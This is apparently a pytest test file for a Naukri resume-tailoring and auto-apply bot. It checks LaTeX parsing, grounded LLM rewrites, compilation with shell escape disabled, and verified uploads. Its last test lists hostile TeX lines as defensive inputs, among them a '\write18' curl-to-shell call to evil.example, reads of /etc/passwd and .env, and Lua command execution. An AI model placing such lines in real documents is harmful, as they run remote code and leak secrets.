"""The resume: parsed from LaTeX, tailored only within what it already says,
compiled, and put on the Naukri profile with the upload verified.

What must hold: rendering unchanged sections reproduces the file byte for
byte; a proposal may reorder skills and reword the summary and subtitle but
never add a tool, employer or number the resume does not contain; an upload
counts only when the profile shows the new file with today's date after a
reload; tailoring runs before each real application and never on a dry run.
"""

import json
import os
import subprocess
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from naukri_bot import apply as apply_module
from naukri_bot import auth, cli, ranking, sources
from common import browser, llm
from common import resume as rs
from naukri_bot import update_profile as up
from common.models import (
    ApplyResult,
    ApplyStatus,
    JobPosting,
    LoginResult,
    Profile,
    ScoredJob,
    Settings,
)

SUMMARY = (
    "I'm a software engineer who works on evaluating AI agents and large language "
    "models. Most of my time goes into growing the open-source WildClawBench "
    "benchmark on the OpenClaw harness into a multi-provider evaluation platform "
    "with LLM-as-judge grading and cost tracking for Claude on AWS Bedrock. Before "
    "that I built Next.js front-ends and LangChain pipelines, and wrote FastAPI "
    "services for a small team. I like plain code, measured results and short "
    "feedback loops, and I would rather show a benchmark run than describe one."
)

TEX = """\\documentclass[a4paper,9pt]{extarticle}
\\usepackage{xcolor}
\\definecolor{muted}{HTML}{555555}
\\begin{document}

\\begin{center}
  {\\LARGE\\bfseries\\color{ink} JANE DOE}\\\\[3pt]
  {\\normalsize\\color{muted} Software Engineer \\;$\\cdot$\\; AI Agent Evaluation \\& LLM Tooling}\\\\[5pt]
  {\\small Indore, India}
\\end{center}

\\section{Summary}
%s

\\section{Professional Experience}
Ethara AI, Gurugram. Evaluation platform work.

\\section{Skills}
{\\bfseries Languages:} Python, JavaScript, TypeScript, SQL\\par\\vspace{2pt}
{\\bfseries AI / LLM:} LLM-as-judge councils, agent benchmarking (OpenClaw, WildClawBench), RAG, LangChain\\par\\vspace{2pt}
{\\bfseries Web:} React.js, Next.js, FastAPI\\par\\vspace{2pt}

\\section{Education \\& Certifications}
B.Tech, 2024.
\\end{document}
""" % SUMMARY


@pytest.fixture
def base(tmp_path):
    path = tmp_path / "base.tex"
    path.write_text(TEX, encoding="utf-8")
    return rs.load_base(str(path))


@pytest.fixture(autouse=True)
def _no_pauses(monkeypatch):
    monkeypatch.setattr(rs, "human_pause", lambda *a, **k: None)


# --- parsing and rendering --------------------------------------------------------


def test_sections_are_read_from_the_tex(base):
    sections = base.sections
    assert sections.subtitle == "Software Engineer \\;$\\cdot$\\; AI Agent Evaluation \\& LLM Tooling"
    assert sections.summary == SUMMARY
    assert [category for category, _ in sections.skills] == ["Languages", "AI / LLM", "Web"]
    assert sections.skills[1][1] == [
        "LLM-as-judge councils",
        "agent benchmarking (OpenClaw, WildClawBench)",
        "RAG",
        "LangChain",
    ]


def test_rendering_unchanged_sections_reproduces_the_file(base):
    assert rs.render(base.tex, base.sections) == base.tex


def test_rendering_changes_only_the_three_sections(base):
    sections = rs.ResumeSections(
        subtitle="Backend Engineer",
        summary="New summary.",
        skills=[
            ("Languages", ["SQL", "Python", "JavaScript", "TypeScript"]),
            base.sections.skills[1],
            base.sections.skills[2],
        ],
    )
    rendered = rs.render(base.tex, sections)
    assert "{\\normalsize\\color{muted} Backend Engineer}\\\\[5pt]" in rendered
    assert "\\section{Summary}\nNew summary.\n" in rendered
    assert "{\\bfseries Languages:} SQL, Python, JavaScript, TypeScript\\par\\vspace{2pt}" in rendered
    assert rendered.count("\\section{") == base.tex.count("\\section{")
    assert "Ethara AI, Gurugram" in rendered


def test_missing_skills_section_is_an_error():
    with pytest.raises(rs.ResumeError):
        rs.parse_sections(TEX.replace("\\section{Skills}", "\\section{Tools}"))


def test_file_name_comes_from_the_header_name(base):
    assert rs.pdf_file_name(base) == "Jane_Doe_Resume.pdf"
    assert rs.pdf_file_name(base, "CV_2026") == "CV_2026.pdf"


# --- what a proposal may change ---------------------------------------------------


def test_terms_the_resume_never_mentions_are_caught(base):
    text = "I run Kubernetes clusters and LangChain pipelines on AWS Bedrock for 40 teams."
    assert rs.ungrounded_terms(text, base) == ["Kubernetes", "40"]


def test_skills_may_only_be_reordered(base):
    accepted, notes = rs._accept_skills(
        base.sections.skills,
        {
            "Languages": ["TypeScript", "Python", "JavaScript", "SQL"],
            "AI / LLM": ["LangChain", "Kubernetes", "RAG"],
        },
    )
    assert accepted[0] == ("Languages", ["TypeScript", "Python", "JavaScript", "SQL"])
    assert accepted[1] == base.sections.skills[1]
    assert accepted[2] == base.sections.skills[2]
    assert any("added or dropped" in note for note in notes)


def test_skill_notes_read_as_plain_text():
    accepted, notes = rs._accept_skills(
        [("Data \\& Infra", ["SQL", "R\\&D tooling"])], {"Data \\& Infra": ["R\\&D tooling", "SQL"]}
    )
    assert accepted == [("Data \\& Infra", ["R\\&D tooling", "SQL"])]
    assert notes == ["skills Data & Infra: reordered to lead with R&D tooling"]


@pytest.mark.parametrize(
    "proposal",
    [
        "I'm a passionate engineer who evaluates AI agents and large language models. " * 5,
        "I evaluate AI agents \u2014 and large language models. " * 8,
        "I evaluate AI agents and large language models on Kubernetes. " * 8,
        "Too short.",
    ],
)
def test_bad_summary_proposals_keep_the_base_text(base, proposal):
    text, notes = rs._accept_text(base, "summary", proposal, SUMMARY, (60, 130))
    assert text == SUMMARY
    assert notes and "rejected" in notes[0]


def test_a_grounded_rewrite_is_accepted(base):
    proposal = (
        "I build LangChain pipelines and Next.js front-ends, and I evaluate AI agents "
        "and large language models. Most of my time goes into growing the open-source "
        "WildClawBench benchmark on the OpenClaw harness into a multi-provider "
        "evaluation platform with LLM-as-judge grading and cost tracking for Claude on "
        "AWS Bedrock. I wrote FastAPI services for a small team and I like plain code, "
        "measured results and short feedback loops."
    )
    text, notes = rs._accept_text(base, "summary", proposal, SUMMARY, (60, 130))
    assert text == proposal
    assert notes == ["summary rewritten"]


class _Client:
    def __init__(self, response):
        self.response = response
        self.prompts = []

    def available(self):
        return True

    def complete_json(self, prompt, schema_hint):
        self.prompts.append(prompt)
        return self.response


def _job(**overrides):
    values = dict(
        job_id="j1",
        url="https://www.naukri.com/job-listings-j1",
        title="LangChain Engineer",
        company="Acme",
        description="Build LangChain agents in Python. 100% remote.",
    )
    values.update(overrides)
    return JobPosting(**values)


def test_tailoring_takes_the_reorder_and_refuses_the_invented_claim(base):
    client = _Client(
        {
            "subtitle": "Software Engineer \\;$\\cdot$\\; LangChain \\& Agent Evaluation",
            "summary": "I ship Kubernetes operators for a living. " * 10,
            "skills": {"AI / LLM": ["LangChain", "RAG", "agent benchmarking (OpenClaw, WildClawBench)", "LLM-as-judge councils"]},
            "notes": "Led with LangChain.",
        }
    )
    sections, notes = rs.tailor(client, base, _job())
    assert sections.subtitle == "Software Engineer \\;$\\cdot$\\; LangChain \\& Agent Evaluation"
    assert sections.summary == SUMMARY
    assert sections.skills[1][1][0] == "LangChain"
    assert any("Kubernetes" in note for note in notes)
    assert "model: Led with LangChain." in notes
    assert all("100% remote" in prompt for prompt in client.prompts)


def test_a_rewritten_summary_may_barely_grow():
    assert rs.summary_bounds("word " * 79) == (59, 89)
    assert rs.summary_bounds("word " * 40) == (30, 50)


def test_no_proposal_leaves_the_resume_alone(base):
    sections, notes = rs.tailor(_Client(None), base, _job())
    assert sections == base.sections
    assert notes == ["LLM gave no usable proposal; resume left as is"]


# --- compiling: the tailored resume must not grow a page -------------------------


def test_page_objects_are_counted_inside_compressed_streams(tmp_path):
    import zlib

    body = b"<< /Type /Pages /Count 2 >> << /Type /Page /Parent 1 0 R >> << /Type/Page>>"
    packed = zlib.compress(b"<< /Type /Page /Contents 5 0 R >>")
    pdf = tmp_path / "x.pdf"
    pdf.write_bytes(b"%PDF-1.5\n" + body + b"\nstream\n" + packed + b"\nendstream\n")
    assert rs.pdf_page_count(pdf) == 3


GROUNDED_REWRITE = (
    "I build LangChain pipelines and Next.js front-ends, and I evaluate AI agents "
    "and large language models. Most of my time goes into growing the open-source "
    "WildClawBench benchmark on the OpenClaw harness into a multi-provider "
    "evaluation platform with LLM-as-judge grading and cost tracking for Claude on "
    "AWS Bedrock. I wrote FastAPI services for a small team and I like plain code, "
    "measured results and short feedback loops."
)


@pytest.fixture
def fake_compiler(monkeypatch, tmp_path):
    """compile_pdf writes the .tex bytes as the 'PDF'; a rewritten summary makes it two pages."""

    def _compile(tex_path, out_dir, compiler="", timeout_s=240):
        out_dir.mkdir(parents=True, exist_ok=True)
        pdf = out_dir / (tex_path.stem + ".pdf")
        pdf.write_bytes(tex_path.read_bytes())
        return pdf

    monkeypatch.setattr(rs, "compile_pdf", _compile)
    monkeypatch.setattr(
        rs, "pdf_page_count", lambda path: 2 if b"I build LangChain pipelines" in path.read_bytes() else 1
    )
    monkeypatch.setattr(rs, "find_compiler", lambda preferred="": ("tectonic", "/usr/bin/true"))
    return tmp_path


def _tailor_settings(base, tmp_path):
    return Settings(email="e", password="p", resume_path=str(base.path), resume_out_dir=str(tmp_path / "out"))


def test_a_summary_that_adds_a_page_is_dropped_but_the_reorder_kept(base, fake_compiler):
    client = _Client(
        {
            "summary": GROUNDED_REWRITE,
            "skills": {"Web": ["FastAPI", "Next.js", "React.js"]},
        }
    )
    pdf, notes = rs.build_tailored_pdf(_tailor_settings(base, fake_compiler), client, _job())
    tex = (pdf.parent / "tailored.tex").read_text()
    assert pdf.name == "Jane_Doe_Resume.pdf" and pdf.parent.name == "Acme - LangChain Engineer"
    assert (pdf.parent / "posting.txt").exists() and (pdf.parent / "tailoring.json").exists()
    assert SUMMARY in tex and GROUNDED_REWRITE not in tex
    assert "{\\bfseries Web:} FastAPI, Next.js, React.js" in tex
    assert "summary rewritten" in notes
    assert any("kept the base summary" in note for note in notes)
    record = json.loads((pdf.parent / "tailoring.json").read_text())
    assert record["notes"] == notes


def test_a_tailored_resume_that_fits_is_used(base, fake_compiler):
    client = _Client({"skills": {"Web": ["FastAPI", "Next.js", "React.js"]}})
    pdf, notes = rs.build_tailored_pdf(_tailor_settings(base, fake_compiler), client, _job())
    assert pdf.parent.name == "Acme - LangChain Engineer"
    assert "FastAPI, Next.js, React.js" in pdf.read_text()
    assert not any("base" in note for note in notes)


def test_a_broken_build_falls_back_to_the_base_pdf(base, fake_compiler, monkeypatch):
    def _broken(tex_path, out_dir, compiler="", timeout_s=240):
        if tex_path.name == "tailored.tex":
            raise rs.ResumeError("tectonic failed")
        out_dir.mkdir(parents=True, exist_ok=True)
        pdf = out_dir / (tex_path.stem + ".pdf")
        pdf.write_bytes(b"base")
        return pdf

    monkeypatch.setattr(rs, "compile_pdf", _broken)
    client = _Client({"skills": {"Web": ["FastAPI", "Next.js", "React.js"]}})
    pdf, notes = rs.build_tailored_pdf(_tailor_settings(base, fake_compiler), client, _job())
    assert pdf.parent.name == "base"
    assert notes[-1] == "tailoring failed to compile; used the base resume"


# --- the upload against a fake profile page ---------------------------------------


class _Node:
    def __init__(self, page, kind):
        self.page = page
        self.kind = kind

    def is_displayed(self):
        return self.kind != "message" or bool(self.page.message)

    @property
    def text(self):
        if self.kind == "name":
            return self.page.name
        if self.kind == "preview":
            return "%s | Uploaded on %s | download | delete" % (self.page.name, self.page.date)
        if self.kind == "message":
            return self.page.message
        return ""

    def send_keys(self, value):
        self.page.send_keys(value)


class _ProfilePage:
    """The profile as Selenium sees it: one resume card with a hidden file input."""

    _KINDS = {
        rs._RESUME_CARD: "card",
        rs._RESUME_NAME: "name",
        rs._RESUME_PREVIEW: "preview",
        rs._RESUME_MESSAGE: "message",
        rs._RESUME_INPUT: "input",
    }

    def __init__(
        self, name="Old_resume.pdf", date="Jul 21, 2026", refuse="", forget_on_reload=False,
        confirm=True, lost=False,
    ):
        self.name = name
        self.date = date
        self.refuse = refuse
        self.forget_on_reload = forget_on_reload
        self.confirm = confirm
        self.lost = lost
        self.message = ""
        self.sent = []
        self.navigations = []
        self.current_url = "about:blank"

    def get(self, url):
        self.navigations.append(url)
        self.current_url = url
        self.message = ""
        if self.forget_on_reload and self.sent:
            self.name, self.date = "Old_resume.pdf", "Jul 21, 2026"

    def find_elements(self, by, selector):
        kind = self._KINDS.get(selector)
        return [_Node(self, kind)] if kind else []

    def find_element(self, by, selector):
        return self.find_elements(by, selector)[0]

    def execute_script(self, script, *args):
        return None

    def send_keys(self, value):
        self.sent.append(value)
        if self.refuse:
            self.message = self.refuse
            return
        if self.lost:
            return
        self.name = os.path.basename(value)
        self.date = rs._today_labels()[0]
        if self.confirm:
            self.message = "GreenTick Success Resume has been successfully uploaded."


@pytest.fixture
def pdf(tmp_path):
    path = tmp_path / "Jane_Doe_Resume.pdf"
    path.write_bytes(b"%PDF-1.4 test")
    return path


def test_dry_run_reads_the_card_and_sends_nothing(pdf):
    page = _ProfilePage()
    result = rs.upload_resume(page, pdf, dry_run=True)
    assert page.sent == []
    assert result.uploaded is False
    assert result.file_name == "Old_resume.pdf"


def test_an_upload_is_verified_after_a_reload(pdf):
    page = _ProfilePage()
    result = rs.upload_resume(page, pdf)
    assert page.sent == [str(pdf.resolve())]
    assert page.navigations == [rs.PROFILE_URL, rs.PROFILE_URL]
    assert result.uploaded is True
    assert result.file_name == "Jane_Doe_Resume.pdf"
    assert "Uploaded on" in result.shown


def test_a_changed_card_proves_an_upload_without_the_message(pdf):
    page = _ProfilePage(confirm=False)
    assert rs.upload_resume(page, pdf).uploaded is True


def test_a_same_day_reupload_counts_once_naukri_confirms_it(pdf):
    page = _ProfilePage(name="Jane_Doe_Resume.pdf", date=rs._today_labels()[0])
    assert rs.upload_resume(page, pdf).uploaded is True


def test_a_same_day_reupload_without_confirmation_is_an_error(pdf, monkeypatch):
    monkeypatch.setattr(rs, "UPLOAD_WAIT_S", 0.6)
    page = _ProfilePage(name="Jane_Doe_Resume.pdf", date=rs._today_labels()[0], lost=True)
    with pytest.raises(rs.ResumeError, match="confirm the upload"):
        rs.upload_resume(page, pdf)
    assert page.navigations == [rs.PROFILE_URL]


def test_a_refused_upload_is_an_error(pdf):
    page = _ProfilePage(refuse="File size exceeds 2 MB")
    with pytest.raises(rs.ResumeError, match="refused"):
        rs.upload_resume(page, pdf)


def test_a_file_that_vanishes_on_reload_is_not_counted(pdf):
    page = _ProfilePage(forget_on_reload=True)
    with pytest.raises(rs.ResumeError, match="after reload"):
        rs.upload_resume(page, pdf)


def test_a_missing_pdf_never_touches_the_browser(tmp_path):
    page = _ProfilePage()
    with pytest.raises(rs.ResumeError, match="not found"):
        rs.upload_resume(page, tmp_path / "nope.pdf")
    assert page.navigations == []


# --- the daily updater ------------------------------------------------------------


def test_the_same_pdf_goes_up_once_a_day(pdf):
    assert up.resume_due({}, pdf, today="2026-10-10")
    state = {"resume": {"digest": rs.file_digest(pdf), "date": "2026-10-10"}}
    assert not up.resume_due(state, pdf, today="2026-10-10")
    assert up.resume_due(state, pdf, today="2026-10-11")
    pdf.write_bytes(b"%PDF-1.4 edited")
    assert up.resume_due(state, pdf, today="2026-10-10")


def test_mark_resume_survives_the_slot_pruning(tmp_path, pdf):
    path = tmp_path / "state.json"
    for day in range(1, 60):
        up.mark(path, "2026-08-%02d 09:00" % (day % 28 + 1), done=True)
    up.mark_resume(path, pdf)
    for day in range(1, 60):
        up.mark(path, "2026-09-%02d 13:30" % (day % 28 + 1), done=True)
    state = json.loads(path.read_text())
    assert state["resume"]["digest"] == rs.file_digest(pdf)
    assert state["resume"]["file"] == str(pdf)


def test_run_once_uploads_after_the_headline(monkeypatch, pdf):
    calls = []
    page = _ProfilePage()
    monkeypatch.setattr(browser, "create_driver", lambda settings: page)
    monkeypatch.setattr(auth, "ensure_logged_in", lambda d, s: LoginResult(ok=True, reason="session_reused"))
    monkeypatch.setattr(
        up,
        "update_resume_headline",
        lambda d, dry_run=False: calls.append("headline") or up.HeadlineUpdate("a", "a.", saved=True),
    )
    monkeypatch.setattr(
        rs,
        "upload_resume",
        lambda d, p, dry_run=False: calls.append("resume") or rs.ResumeUpload(p.name, "today", True),
    )
    settings = Settings(email="e", password="p")
    result = up.run_once(settings, resume_pdf=pdf)
    assert calls == ["headline", "resume"]
    assert result.saved and result.resume.uploaded

    assert up.run_once(settings).resume is None


def test_a_failed_upload_is_reported_without_losing_the_headline(monkeypatch, pdf, tmp_path):
    page = _ProfilePage(refuse="File size exceeds 2 MB")
    page.save_screenshot = lambda path: True
    monkeypatch.setattr(browser, "create_driver", lambda settings: page)
    monkeypatch.setattr(auth, "ensure_logged_in", lambda d, s: LoginResult(ok=True, reason="session_reused"))
    monkeypatch.setattr(up, "update_resume_headline", lambda d, dry_run=False: up.HeadlineUpdate("a", "a.", saved=True))
    result = up.run_once(Settings(email="e", password="p", screenshot_dir=str(tmp_path)), resume_pdf=pdf)
    assert result.saved
    assert result.resume is None
    assert "refused" in result.resume_error


# --- tailoring inside the apply loop ----------------------------------------------


def _settings(**overrides):
    values = dict(
        email="t@example.com",
        password="secret",
        daily_quota=50,
        target_applications=50,
        min_score=55.0,
        max_days_old=3,
        apply_delay_min_s=0.0,
        apply_delay_max_s=0.0,
        dry_run=False,
        tailor_resume=True,
    )
    values.update(overrides)
    return Settings(**values)


def _scored(jid):
    job = JobPosting(
        job_id=jid,
        url="https://www.naukri.com/job-listings-%s" % jid,
        title="Role %s" % jid,
        company="Co %s" % jid,
        posted_days_ago=0,
    )
    return ScoredJob(job=job, score=80.0, llm_score=80.0)


class _TwoTabs:
    """Enough of a WebDriver to open, switch and record tabs."""

    def __init__(self):
        self.window_handles = ["apply"]
        self.current_window_handle = "apply"
        self.switch_to = self
        self.seen = []

    def new_window(self, kind):
        self.window_handles.append("resume")
        self.current_window_handle = "resume"

    def window(self, handle):
        self.current_window_handle = handle

    def quit(self):
        pass


@pytest.fixture
def apply_loop(monkeypatch, tmp_path):
    """run() with every outward edge replaced; records resume work and applications in order."""
    events = []
    queue = [_scored("a"), _scored("b")]
    driver = _TwoTabs()

    class _LLM:
        def available(self):
            return True

    monkeypatch.setattr(llm, "build_client", lambda settings: _LLM())
    monkeypatch.setattr(browser, "create_driver", lambda settings: driver)
    monkeypatch.setattr(auth, "ensure_logged_in", lambda d, s: LoginResult(ok=True, reason="session_reused"))
    monkeypatch.setattr(sources, "collect_candidates", lambda *a, **k: [s.job for s in queue])
    monkeypatch.setattr(ranking, "rank", lambda *a, **k: list(queue))

    def _apply(d, job, profile, engine, settings):
        driver.seen.append("apply %s in %s" % (job.job_id, d.current_window_handle))
        events.append("apply %s" % job.job_id)
        return ApplyResult(job_id=job.job_id, url=job.url, status=ApplyStatus.APPLIED, quota_consumed=True)

    monkeypatch.setattr(apply_module, "apply_to_job", _apply)

    def _tailored(settings, client, job):
        events.append("tailor %s" % job.job_id)
        return tmp_path / job.job_id / "Jane_Doe_Resume.pdf", ["summary rewritten"]

    monkeypatch.setattr(rs, "build_tailored_pdf", _tailored)
    monkeypatch.setattr(rs, "build_base_pdf", lambda settings: events.append("base") or tmp_path / "base.pdf")
    monkeypatch.setattr(
        rs,
        "upload_resume",
        lambda d, p, dry_run=False: driver.seen.append("upload %s in %s" % (p.name, d.current_window_handle))
        or events.append("upload %s" % p.name)
        or rs.ResumeUpload(p.name, "today", True),
    )

    def _run(settings):
        settings.db_path = str(tmp_path / "test.db")
        return cli.run(settings, Profile(full_name="T"))

    _run.driver = driver
    return _run, events


def test_each_real_application_gets_its_own_resume_first(apply_loop):
    run, events = apply_loop
    summary = run(_settings())
    assert summary.applied == 2
    assert events == [
        "tailor a",
        "upload Jane_Doe_Resume.pdf",
        "apply a",
        "tailor b",
        "upload Jane_Doe_Resume.pdf",
        "apply b",
        "base",
        "upload base.pdf",
    ]


def test_a_dry_run_never_touches_the_resume(apply_loop):
    run, events = apply_loop
    run(_settings(dry_run=True))
    assert not any(event.startswith(("tailor", "upload", "base")) for event in events)


def test_tailoring_off_leaves_the_profile_alone(apply_loop):
    run, events = apply_loop
    run(_settings(tailor_resume=False))
    assert events == ["apply a", "apply b"]


def test_a_resume_problem_does_not_stop_the_application(apply_loop, monkeypatch):
    run, events = apply_loop

    def _broken(settings, client, job):
        raise rs.ResumeError("tectonic failed")

    monkeypatch.setattr(rs, "build_tailored_pdf", _broken)
    summary = run(_settings())
    assert summary.applied == 2
    assert events == ["apply a", "apply b"]


def test_a_crash_mid_run_still_puts_the_base_resume_back(apply_loop, monkeypatch):
    run, events = apply_loop

    def _crash(driver, job, profile, engine, settings):
        events.append("apply %s" % job.job_id)
        raise TypeError("boom")

    monkeypatch.setattr(apply_module, "apply_to_job", _crash)
    with pytest.raises(TypeError):
        run(_settings())
    assert events == ["tailor a", "upload Jane_Doe_Resume.pdf", "apply a", "base", "upload base.pdf"]


def test_resumes_change_in_their_own_tab_while_jobs_open_in_the_first(apply_loop):
    run, events = apply_loop
    run(_settings())
    assert run.driver.window_handles == ["apply", "resume"]
    assert run.driver.seen == [
        "upload Jane_Doe_Resume.pdf in resume",
        "apply a in apply",
        "upload Jane_Doe_Resume.pdf in resume",
        "apply b in apply",
        "upload base.pdf in resume",
    ]
    assert run.driver.current_window_handle == "apply"


BULLETED = TEX.replace(
    "Ethara AI, Gurugram. Evaluation platform work.\n",
    "\\role{Software Engineer}{2024 -- Present}{Ethara AI}\n"
    "\\begin{itemize}\n"
    "  \\item Built Next.js dashboards for model training.\n"
    "  \\item Built LangChain pipelines that benchmark\n"
    "    five model providers.\n"
    "  \\item Owned training-data quality checks.\n"
    "\\end{itemize}\n",
)


@pytest.fixture
def bulleted(tmp_path):
    path = tmp_path / "bulleted.tex"
    path.write_text(BULLETED, encoding="utf-8")
    return rs.load_base(str(path))


def test_bullets_are_read_with_their_continuation_lines(bulleted):
    assert bulleted.sections.bullets == [[
        "  \\item Built Next.js dashboards for model training.",
        "  \\item Built LangChain pipelines that benchmark\n    five model providers.",
        "  \\item Owned training-data quality checks.",
    ]]
    assert rs.bullet_headings(bulleted.tex) == ["Software Engineer 2024 -- Present Ethara AI"]
    assert rs.render(bulleted.tex, bulleted.sections) == bulleted.tex


def test_the_model_may_put_the_relevant_bullet_first_but_not_change_a_word(bulleted):
    client = _Client({"bullets": [[1, 0, 2]]})

    sections, notes = rs.tailor(client, bulleted, _job())

    rendered = rs.render(bulleted.tex, sections)
    assert rendered.index("LangChain pipelines") < rendered.index("Next.js dashboards") < rendered.index("training-data")
    assert sorted(rendered.splitlines()) == sorted(bulleted.tex.splitlines())
    assert 'bullets under Software Engineer 2024 -- Present Ethara AI: now lead with "Built LangChain pipelines that benchmark five model providers."' in notes
    assert '"0: Built Next.js dashboards for model training."' in client.prompts[-1]


@pytest.mark.parametrize("proposal", [[[0, 0, 1]], [[0, 1]], [["a", "b", "c"]], "first"])
def test_a_bullet_order_that_drops_or_repeats_one_is_refused(bulleted, proposal):
    sections, notes = rs.tailor(_Client({"bullets": proposal}), bulleted, _job())

    assert sections.bullets == bulleted.sections.bullets


# --- the compiler never runs shell commands from the .tex -----------------------------------


@pytest.mark.parametrize("name", ["pdflatex", "xelatex", "lualatex"])
def test_latex_compilers_run_with_shell_escape_off(monkeypatch, tmp_path, name):
    tex = tmp_path / "resume.tex"
    tex.write_text(TEX, encoding="utf-8")
    seen = {}

    def fake_run(command, **kwargs):
        seen["command"] = command
        (tmp_path / "out" / "resume.pdf").write_bytes(b"%PDF-1.4 ok")
        return subprocess.CompletedProcess(command, 0, "", "")

    monkeypatch.setattr(rs, "find_compiler", lambda preferred="": (name, "/fake/" + name))
    monkeypatch.setattr(rs.subprocess, "run", fake_run)
    assert rs.compile_pdf(tex, tmp_path / "out").read_bytes() == b"%PDF-1.4 ok"
    assert seen["command"][:2] == ["/fake/" + name, "-no-shell-escape"]
    assert "-halt-on-error" in seen["command"] and seen["command"][-1] == str(tex)


def test_tectonic_gets_no_latex_only_flags(monkeypatch, tmp_path):
    tex = tmp_path / "resume.tex"
    tex.write_text(TEX, encoding="utf-8")
    seen = {}

    def fake_run(command, **kwargs):
        seen["command"] = command
        (tmp_path / "out" / "resume.pdf").write_bytes(b"%PDF-1.4 ok")
        return subprocess.CompletedProcess(command, 0, "", "")

    monkeypatch.setattr(rs, "find_compiler", lambda preferred="": ("tectonic", "/fake/tectonic"))
    monkeypatch.setattr(rs.subprocess, "run", fake_run)
    rs.compile_pdf(tex, tmp_path / "out")
    assert seen["command"] == ["/fake/tectonic", "--outdir", str(tmp_path / "out"), str(tex)]


@pytest.mark.parametrize(
    "line",
    [
        "\\write18{curl evil.example | sh}",
        "\\immediate\\write18{id}",
        "\\input{/etc/passwd}",
        "\\include{../../.env}",
        "\\InputIfFileExists{.env}{}{}",
        "\\openin1=.env",
        "\\directlua{os.execute('id')}",
        "\\ShellEscape{id}",
        "\\csname input\\endcsname{.env}",
    ],
)
def test_tex_that_runs_programs_or_reads_files_is_unsafe(line):
    assert rs.unsafe_tex(TEX.replace("\\end{document}", line + "\n\\end{document}")) is not None


def test_the_template_and_a_normal_resume_are_safe():
    assert rs.unsafe_tex(TEX) is None
    assert rs.unsafe_tex("\\usepackage{inputenc} \\includegraphics{x} \\readme") is None
